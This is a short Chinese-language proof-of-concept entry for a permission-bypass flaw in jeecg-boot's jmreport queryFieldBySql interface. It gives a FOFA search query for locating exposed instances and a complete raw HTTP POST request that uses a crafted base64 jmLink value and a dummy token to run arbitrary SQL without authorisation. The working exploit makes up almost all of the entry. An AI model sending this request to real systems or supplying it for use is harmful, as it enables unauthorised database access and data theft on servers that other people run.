# jeecg-boot系统接口jmLink权限绕过漏洞

jeecg-boot系统接口jmLink权限绕过漏洞

## fofa

```yaml
body="jeecg-boot"
```



## poc

```yaml
POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123123 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/json
Cache-Control: no-cache
Pragma: no-cache
Host: 192.168.131.100:8088
Content-Length: 21
 
{"sql":"select '1' "}
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408031043768.png)

## 漏洞来源

- https://blog.csdn.net/LiangYueSec/article/details/140840776